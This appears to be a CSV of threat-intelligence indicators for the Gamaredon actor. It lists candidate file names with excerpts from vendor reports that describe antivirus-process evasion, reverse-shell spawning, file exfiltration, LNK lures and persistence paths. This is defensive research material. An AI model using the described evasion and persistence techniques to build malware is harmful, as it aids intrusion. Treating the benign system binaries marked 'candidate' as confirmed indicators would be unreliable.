schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:aee55e941c4fd8c30d65bd20dd48567b095b03a52f004cfd6c5102a7697aef27,observation--sha256:f34e7671a81b095cbf5cc45c0a0e2573a9e4e82ca2a1171c140edd8e572cf95f,file-name,blackd.exe,blackd.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:a7994d317494a44b221791272fed272f13b8b1f09087f85dd35678770989bb58,observation--sha256:86c7f21498ad03a5006f54236807d0d030fc1aa5c94e7c54d7e510c0a3557bd2,file-name,blackice.exe,blackice.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:03a4b7397253e3a838b905539a61ccd4dbc50365f7a4a22d0e839ea86290a23c,observation--sha256:f6e96bdc1c356e99d0f81abcd8eddba53f8d575d511ec2fe7a9eb1b0db222fd2,file-name,boot.ini,boot.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Improving LNK lures The second variant of PteroLNK creates three types of malicious LNK files, each designed to lure victims into executing them. Over the course of 2025, Gamaredon repeatedly refined how these LNK files were generated, focusing on naming strategies and file t argeting to maximize the likelihood of user interaction. Below is a summary of each type and its final state by the end of the year: 1. LNK fi",
1.0.0,actor--gamaredon,artifact--sha256:03a4b7397253e3a838b905539a61ccd4dbc50365f7a4a22d0e839ea86290a23c,observation--sha256:593845723de2313c8e0bb49cf9afa612806d52378adf1c25c5c396ba06745d7e,file-name,boot.ini,boot.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:03a4b7397253e3a838b905539a61ccd4dbc50365f7a4a22d0e839ea86290a23c,observation--sha256:acefd3226bc9d5df5a60ef2734f1960e61b1e5487a6b1d8c8e2316700645df50,file-name,boot.ini,boot.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:e5e26713e8fb69bdd2ecb16e05cd01be7f1db2e6d667c40bfd949879b9714ff7,observation--sha256:f7acee5ef47e7751e4d0db11a1be74ae32ea31b5402095c31688282b0acbf9fe,file-name,cacls.exe,cacls.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:7ce14a7e22e0d33c6f0f8a80820ba0293b2bf48c830bbc0b33348f22a32a663d,observation--sha256:d6abacd4e86a78a9bf942c99fa657fefd9829d9a49732d33a99b47fe2b3470da,file-name,cloudflared.exe,cloudflared.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:ef5e32fd4c07b3a059baf9fc92e0893ac037a04abbf7cdcd6c94480cbf280f95,observation--sha256:7c0afbbf5d06b570c4ae73c7c4ae6a0236fa86f5713d052eb32777b7345671ae,file-name,cmccore.exe,cmccore.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:abbf4c7d857a20142ae7afd46ad04c5509fab43ab6a8f8db482fe62f6a029f5b,observation--sha256:8db4822c8734a3a19410c622912fd25efaf85ecb07dad1af8d3df7f581b8b334,file-name,cmctrayicon.exe,cmctrayicon.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:a2c77e4326aedebe65e2efb83dceb40d15c1519e4aab7fe456f3c28e4338fa7e,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 11. Sample configuration file for Win32/Dipsind.A Each Dipsind file contains an embedded encrypted configuration file that acts as a control for the backdoor. This configuration file also includes the initial command and control (C&C) location the Dipsind backdoor uses in addition to the pollcommandsite variable which references a URL where additional backup C&Cs can be polled. Configurable parameters include instructions on where Dipsind should install a copy of cmd.exe for spawning a re,
1.0.0,actor--gamaredon,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:ab24fd1a8bda8c3916b006f501b2ab3183b3ede6ebdc9fcfe5e69e8c73fa7574,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:5201369586f8d2de3225e58761a8fc6ecf327d5389002bd66037b8f2537ac128,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:943c4fc5edd2defe05282c35e004a1ebd8bb47c7d16c55b63f6aaf73a6ff2cea,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:aec12eff1fe00aef79085e80802f925548c08306bfb7901486d1eb47a3070212,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:8944ab0d08ffa852b9b04f6584575ccbbcf538e5db61a42bd045f307cbc5fc10,observation--sha256:b8638d493dc8067cfc13716d721e71283089de71825d028adc485adbd1814ff5,file-name,desktop.dat,desktop.dat,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:9b0b9091c29d0f3eccea95133e3e3f703da3ead0a7561ecc16e72643b19a2576,observation--sha256:4190a6822b3a11d07eec2427bda0fc40801269850e1b3a04ffb19e1c779e90c2,file-name,desktop.ini,desktop.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:9b0b9091c29d0f3eccea95133e3e3f703da3ead0a7561ecc16e72643b19a2576,observation--sha256:b2444615ae9641990e68c89afbe60fd5b3670e08ff3387570a54babc1d498164,file-name,desktop.ini,desktop.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:636f103868f52ce0a31b0f608bec8f50817f84931ff5229a6e02e8e998fb272e,observation--sha256:1e3cee48ff9678ecb6287d4358677070e18796d605ecbccb60707b0c6cf30dcd,file-name,desktop.sys,desktop.sys,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:3c906e845a79b9ad1e70ff3857bf5dd894091df1cb70a05a79ccfae873ef0cdd,observation--sha256:75b9c787ab6f478d6f51ac0a79b429ad041662bb210e906b4cd20abfc8c5aff3,file-name,desktopc.ini,desktopc.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:3c906e845a79b9ad1e70ff3857bf5dd894091df1cb70a05a79ccfae873ef0cdd,observation--sha256:a73c76c8a1b5af7dc7ec0f493f63ca7fc42ca93bec5aa52d284989a276a1c4fb,file-name,desktopc.ini,desktopc.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:7a5ad8d5c79302c40f5817bd01a97af17b7246395a057a93aeba2a35330e7307,observation--sha256:7539ac36e904f4df315bb0c66493bd28bbea394a3e9e0345d84212a53ecc755c,file-name,desktops.ini,desktops.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
